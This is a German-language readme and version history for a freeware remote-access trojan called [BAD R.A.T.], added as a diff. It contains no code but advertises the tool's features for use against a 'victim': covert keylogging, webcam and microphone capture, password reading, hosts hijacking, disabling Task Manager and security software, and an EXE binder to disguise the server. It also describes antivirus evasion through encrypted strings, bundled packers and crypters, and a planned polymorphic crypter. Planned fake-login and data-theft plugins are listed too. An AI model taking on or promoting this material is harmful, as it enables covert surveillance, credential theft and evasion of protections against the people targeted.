@@ -1,0 +1,409 @@
+## About #####################################################################
+#                                                                            #
+# Name    : [BAD R.A.T.] 1.6 (X-Mas Edition)                                 #
+# Type    : Remote Admin Tool (RAT)                                          #
+# Lizenz  : Freeware                                                         #
+# Coder   : Mr Hawk                                                          #
+# Company : [BAD R.A.T.]-Company                                             #
+# URL     : www.bad-rat.de.vu                                                #
+# Blog    : badrat.blog.de                                                   #
+# Email   : thebadrat@gmx.de                                                 #
+#                                                                            #
+##############################################################################
+
+## Achtung: ##################################################################
+#                                                                            #
+#  Vereinzelte Funktionen sind nicht kompantieble zu früheren Clienten.      #
+#  Autor kann nicht für eventuelle Schäden zur Verantwortung gezogen werden! #
+#  Jeder ist für sein Handeln selbst verwantwortlich!                        #
+#                                                                            #
+##############################################################################
+
+## Achtung: ##################################################################
+#                                                                            #
+#  Aufgrund von komplett neue Daten- und Befehlstruktur ist ab [BR] 1.3      #
+#  nicht mehr mit vorhergehenderen Versionen kompatible!!                    #
+#                                                                            #
+##############################################################################
+
+History:
+[New Version 1.6] (X-Mas Edition)
+ |-[Bugs fixed]
+ |   |- Treeview_Language
+ |   |- TCP_Tunnle
+ |   |- Mehrfachen einer IP ausgeschlossen
+ |   |- Print_Pic_Endungs_Bug
+ |-[Net-Watcher]
+ |   |-Grafische Darstellung verbessert
+ |- [Client]
+ |   |- Programm starten, ohne nervige Nachfrage
+ |   |- Filemanager: Umbennen vereinfacht
+ |   |- Favoriten per Doppelklick starten
+ |   |- Servertool verbessert ((Un-)Bann verbessert)
+ |   |- RemoteScreen (mit Fullscreen-Funktion, jeder Doppelklick wird übertragen)
+ |   |- HD-Label ändern 
+ |   |- MediaCenter (Windows-Media-Sound manipulieren)
+ |   |- Neuer Stub für Exe-Binder (modifiziert und schlanker)
+ |- [Server]
+ |   |-String-Outsourcing (Weniger Angriffsfläche für AV)
+ |   |-KeylogSize
+ |- [Tools]
+ |   |- Winsock.exe ist wieder undec (wieso haben die AVs darauf reagiert?)
+ |   |  (diese Exe installiert nur die Winsock-Komponente)
+ |- [Fun-Cheats]
+ |   |-Eingabe: client.exe {cheat}
+ |   |- /frog 
+ |   |- /dope
+ |   |- /xmas
+ |- [Skin]
+ |   |-X-Mas-Skin
+
+[New Version 1.5]
+ |-[Bugs fixed]
+ |   |- Kill_File_After_Download
+ |- [Client]
+ |   |- CD-Remote (Voller Zugriff auf CD-Laufwerk, Tracks auflisten, Volumecontrol)
+ |   |- Clientsetting: UP/Download
+ |   |          |-Existierende Datei überschreiben oder Name wird erweitert
+ |   |          | (Name+Datum+Zeit+Endung)
+ |   |          |-AutoOpen nach Download für beliegige Endungen (einstellbar)
+ |   |          | (log;txt;gif;bmp;jpg;jpeg;png)
+ |   |          |-Transferdialog aus- bzw. einblenden (bei Up- und Dowl.)
+ |   |- Clientsetting:
+ |   |          |-Quick_Menü und Net_Watch am Client andocken
+ |   |          |-Setting_Kill (Zum Entfernen aller Einträge)
+ |   |- Clientsetting: Sounds
+ |   |          |-Sounds (frei) einstellbar für Connect,Disconnect,Download fertig,
+ |   |          | Client start,Client is not connected
+ |   |- Zeigt an, wie lange man mit Vic verbunden ist
+ |   |- Treeview als alternative Nav
+ |   |- Popupmenü (Dienste,Registry,CD Remote,Prozessmanager,Windowmanger,Filemanager)
+ |- [Server]
+ |   |- Webcam funktioniert endlich (!) Aufnahme und Shot, Aufnahme ist mit Ton
+ |   |  und noch etwas groß (6 Sec=5 MB)... Will ich noch ändern.
+ |-[Serversetup]
+ |   |- Events um "StartPath_Hide" erweitert
+ |-[Script]
+ |   |- AntiAvFw.brr -> Killst viele Startups der gängigen AV/FWs
+ |-[Remove]
+ |   |- ArithMetic_DMC wurde wieder entfernt (hat sich nicht bewährt)
+
+[New Version 1.4]
+ |-[Bugs fixed]
+ |   |- Reg_del
+ |-[Client]
+ |   |- Reg_change und Reg_new vereinfacht (Bessere Strucktur mit hex,dword,string)
+ |   |- MSConfig (Startups,Win.ini,System.ini,boot.ini)
+ |   |- Clientsetting: Reg Refresh
+ |- [Server]
+ |   |- Mirco wird gepackt (mit ArithMetic_DMC), wird im Clienten wieder entpackt
+ |   |- Nochmals kleiner (ungepackt 232 KB)
+ |-[Tests]
+ |   |- ArithMetic_DMC 28KB gepackt auf 7 KB  = auf 25 % gepackt =75 % Packung!
+ |-[Script]
+ |   |- Neues PHP-Notify-Script(nur noch eine Datei)
+ |   |- PHP-MySQL-Notify-Script
+ |   |- CGI-Notify-Script
+
+[New Version 1.3]
+ |-[Bugs fixed und vereinfacht] (Big Thx an Sniper für den Bugreport)
+ |   |- Auflösung ändern
+ |   |- Datei kopieren/löschen/umbennen
+ |   |- C2C-Chat
+ |   |- und einige kleine Sachen
+ |   |- Wallpaper setzen
+ |   |- Mirco_Path_Bug
+ |   |- Webcam_Shot_Path_Bug
+ |   |- MiscControl_Bug
+ |   |- Service_UnChange_Bug
+ |- [Style]
+ |   |- Quickmenü-Leiste
+ |   |- Small-Client-Funktion
+ |   |- Transfermanger zeigt zusätzlich die verbleibende Zeit an
+ |   |- Funktionen in Client ausgelagert
+ |- [Server]
+ |   |- Konstante System-Strings verschlüsselt
+ |   |- Startup-Methoden ausgelagert, werden per Setting an Server angehängt
+ |   |- -> Server(unpacked) ist 24 KB kleiner
+ |-[Client]
+ |   |- Filemanager etwas vereinfach
+ |   |- Sysvars werden in Laufwerkliste eingetragen
+ |   |- Webcam & Mirco vereinfacht
+ |   |- HD Eigenschaften (Frei,Belegt,Total,grafische Darstellung)
+ |   |- neue Daten- und Befehlstruktur
+ |   |- Favoriten auch in Unterordner auslesbar
+ |   |- Clientsetting in neuem Style + Neue Einstellungsmöglichkeiten
+ |   |  (NoAnimation,WebSupport ->badrat://,NoQuickNav)
+ |   |- Fast_Load_Mode und Fast_End_Mode-> Wenn NoAnimation auf True steht
+ |-[ZusatzTools]
+ |   |- Scripteditor für ULR
+ |-[Tests]
+ |   |- Screenshot (1%= 23KB; 100%=380KB; alles in JPG)
+ |   |- Mirco 10s=215 KB
+ |   |- Webcam(5s= 3MB ->Mit Ton und Höchste Auflösung)
+ |   |- Mirco soll noch per MP3-Modul auf 1/10 verkleinert werden
+ |   |- Webcam soll auch kleiner werden...
+ |-[Fun]
+ |   |- 2 Cheatmode (bleibt vorerst geheim)--> Spaß muss sein ;o)
+
+
+[New Version 1.2 Beta]
+ |- TCP-Tunnle + Sendeconsole (auf mehrfachen Wunsch)
+ |- viele kleine Bugs gekillt
+ |- PluginTester als Zusatztool
+ |- Server ist ungepackt. Packer und Crypter liegen bei ;o)
+ |- Eviltoolz wurden entfernt (unnötige Spielerein)
+ |- QuickMenü (kann selbst eingerichtet werden)
+ |- Filemanager übersichtlicher+ Attribute, Erstellungsdatum/-Zeit werden mit abgefragt
+ |- Bei Laufwerke wid jetzt auch der Typ (Festplatte,Wechseldatenträger) angezeigt
+ |- Attribute lesen/setzen (Read only,Hidden,System,Archive,Directory)
+ |- Exe-Binder zusätzlich ins Serversetup mit eingearbeitet
+ |- SIN-Console mit in den Clienten integriert (Agent fällt damit weg)
+ |- Neue Listen-Mode (Immer Listen oder wenn Online/Lan)
+ |- Scripting ULR (United Language for Rats) -> mehr Infos in "Scripting.txt"
+ |- [Design]
+ |   |- Neue Buttons + Comboboxen passen sich optisch mit an (Mac,Java, WinXP+BR-Style)
+ |   |- ListView per Code (bei Dienste,Filemanager und Regedit)
+ |   |- Neue Skins (z.B. Apple)
+ |- [Plugins]
+ |   |- Neues Plugin: Fun mit Taskbar-Transparenz
+ |- [Zusatztools]-> Einzeln runterladen
+ |   |- EXE2VBS kann nun auch in Batch umwandeln
+ |   |- Exe-Binder (Bindet beliebig viele Dateien, aller Formate + Iconchanger)
+ |- [Test]
+ |   |- Transfertest(Localtest):  109 MB in 2:22 Min =Speed 771 KB/S
+ |   |   (Von Externer auf Locale Festplatte)
+ |-[Batch]
+ |   |- TNT_XP_GEN
+ |   |- INFO2FTP
+ |-[ZusatzTools]
+ |   |- Winsock
+ |-[Scripte]
+ |   |- Scripte für Regs/Events/Setting/ULR
+
+
+[Version 1.1 Beta]
+Toolz
+ -> Ip-Tool (Port und IP-Scanner, Tracer)
+ -> Menü passt sich automatisch der Vorhanden Tools
+    (einzelne Programme an)
+ ->Mitgeliefert sind: AdminTool, Agent, ClearramPro,
+                      Downloader,EXE2VBS, ProzessmanagerPro,
+                      Skineditor,ShowPass
+
+Fun
+-> Fakemsg
+  -MsgBox
+  -Inputbox
+->Screencontrol I
+  -Auflösung auslesen/ändern
+  -Systemfarben
+  -Taskbar On/off
+  -Desktop On/off
+  -Monitor On/off
+  -ASE On/off
+  -CD-Rom On/off
+  -Uhr On/off
+  -StartButton On/off
+  -ScreenFreez On/off
+
+->Screencontrol II
+  -Matrix-Text
+  -FlipScreen
+  -Screenshot (in jpg)
+
+->Netzwerkfreigabe
+  -Zugriffrechte
+  -Ordner freigeben
+
+->Screensaver
+  -alle auslesen und als ScrSav übernehmen
+  -(de)aktivieren
+  -starten
+  -3D-Text-Scr/Marquee Parameter ändern
+
+->Mousecontrol
+  -Block T/M
+  -Aktuelle Position
+  -an Position setzen
+  -Sendkey
+  -Time/Date
+  -RunDll32
+
+->Soundcontrol
+  -Beep
+  -Volume/Balance ändern
+
+->InternetExplorer
+  -Startseite lesen/setzen
+  -IE-Titel lesen/setzen
+  -Version lesen/setzen
+  -URL starten
+  -20 letzten URLs
+  -HostHijacking
+
+->Textdrucken
+  -Text drucken mit Bild
+  -Schrift kann Fett, Kursiv, Unterschrichen,
+   Durchgestrichen, Schriftgröße verändert werden
+
+->Script Editor
+  - Scripte (Bat,vbs,JS) senden und starten
+
+->Chat mit Opfer
+
+Spy
+->AllSpy
+  -Userinfos (Name,OS,Prozessor, etc)
+  -Serverinfos (Pfad, Version, etc)
+  -Srv Events (alle BR-Events auflisten)
+  -Srv Killerlist (BR-Killerliste auflisten)
+  -installiere Tools auslesen
+  -letzte Filme auslesen
+  -letzte CMD auslesen
+  -Passwörter (Vorrest nur AIM)
+
+->Micro/Clipboard
+  -Mirco aufnehmen
+  -Clipboard lesen, setzen, leeren
+
+WinSystem
+->Dateimanger
+  -Laufwerke/Netzwerke auflisten
+  -löschen,Starten,Kopieren,Umbennen,Bild drucken,Dateigröße lesen
+   Up/Download (schnell) , Neuer Ordner erstellen, Nach Datei Suchen
+
+->Prozessmanager
+  -Prozesse auflisten/killen
+  -Kill auch nach Kopfzeile
+
+->Windowmanager
+  -Alle Fenster auflisten
+  -Schließen,Max/Min,Sperren/Freigeben,umbenennen,
+   alles minimieren
+
+->Windows beenden
+  -Shutdown
+  -LogOff
+  -Reboot
+
+->Dos-Console (Remote)
+
+->Favoriten
+  -Fav auflisten,auslesen,ändern,erstellen
+
+->Dienste
+  -Alle Dienste auslesen
+  -Starten,System,Automatisch,Manuell,Deaktivieren
+
+->Control Panel
+
+->Misc Control
+  -Regedit (de)aktivieren
+  -Taskmanager (de)aktivieren
+  -CMD (de)aktivieren
+
+Killer
+->Evil Toolz
+  -Nur mit Passwort ;o)
+  -Servertoolz (BannIP,Server neustart/schließen/deinstallieren)
+
+Misc
+->Serversetup
+  -verschiedene Startup Methoden
+  -Lan/Internet
+  -Lokaler zugriff sperren
+  -Taskmanager/Registry/CMD deaktivieren
+  -Melt Server
+  -Ballon-Effect
+  -Anti-Terminate
+  -Warten auf Reboot
+  -eigene Endung wählbar
+  -Regname/Port/Pass/Servername/InstallDir
+  -Fakemsg
+  -PHP/ICQ-Notify
+  -AV/FW Killer (Liste ist freiwählbar; Aktuelle enthält 583 Einträge)
+  -Events (Mini-Scripting mit ServerEvents verbunden)
+  -Regs (Registry einträge gleich bei der Installation -> Add und Del)
+  -Icon-Changer
+  -ByteAdd
+  -fertiger Server wird in grafischer Statistik dargestellt
+
+->Clientsetting
+  -Skin wählbar
+  -Sprache wählbar
+  -Sin Port/IP wählbar
+  -Standartport/Nickname wählbar
+
+->Transfermanager
+  -Transfer wird nacheinander abgearbeitet
+  -läuft schnell und stabiel
+  -überträgt auch große Dateien
+  -Prozessbar,verstrichene Zeit, etc
+
+-> Adressbuch
+
+->Pluginmanager
+  -Plugins laden (falls nicht vorhanden, dann Auto-Upload)
+  -Result kann gespeichert werden
+
+->Redirect-Download
+
+->Client2Client-Chat
+  -Sehen wer online ist
+
+->Log-Manager
+  -alle Vorgänge können geloggt werden für eventuelle Fehlersuche
+
+->Quicklinks zu App-,Tool- und Download-Ordner
+
+-> About
+
+
+Zusätzlich:
+  -Reg-Scripte, Event-Scripte,FW-Listen
+  -Coder-Schema für Phase5² (Develop)
+  -Netwatcher (Netstat ->Diagram und Alle Verbinungen )
+   gesendete und empfangene Bytes
+  -8 Plugins
+  -Php-Script
+
+
+[To Do] (Stand 17.05.05)
+ |-[Funktionen]
+ |  |- Wav2MP3 (als Modul)
+ |  |- Dateieigenschaften (erstellter Server) lesen/ändern
+ |-[Design]
+ |  |- Radiobutton und Checkboxen in Skin-Style (Mac,Java, WinXP)
+ |  |- Backpic auf alle Formen übertragen
+ |-[Plugins]
+ |  |- Fakelogin (Yahoo,AIM,ICQ,Trillian,Netzwerkanmeldung)
+ |  |- Mozialla/Firefox auslesen (URL-History, Favoriten,Version, etc)
+ |  |- Outlook/Firebird auslesen (Adressbuch, Eigene Emailaddy, etc)
+ |  |- Passwörter auslesen (Dialup,ICQ,Trillian,FlashFXP etc)
+ |  |- Autovervollständigung ein/ausschalten und auslesen
+ |  |- Webcam an Desktop weiterleiten + weiter Webcam-Spielerein
+ |-[Tools]
+ |  |- Eigenen Crypter (Polymorph,PE-Crypt,Packer wie UPX)
+
+
+Run-Time
+
+[BR] ist eine VB-Anwendung und benötigt die Runtime 6!
+Falls diese nicht vorhanden ist, bitte unter Google.de
+suchen und Installieren. Ab Win2000 ist sie aber bereits
+mit drauf.
+
+
+Winsock
+
+[BR] benutzt (um Platz zusparen) die Winsock-OCX. Wer diese
+Komponente nicht hat, der kann unter Tools winsock.exe ausführen.
+Die Komponente wird dann Installiert. BTW: Diese EXE kann man auch
+per EXE-Binder an den Server hängen, falls der Vic die OCX nicht hat.
+
+
+Bei Fragen, Vorschlägen, Etc bitte ins Board posten
+www.badrat-board.de.vu
+oder Email
+thebadrat@gmx.de
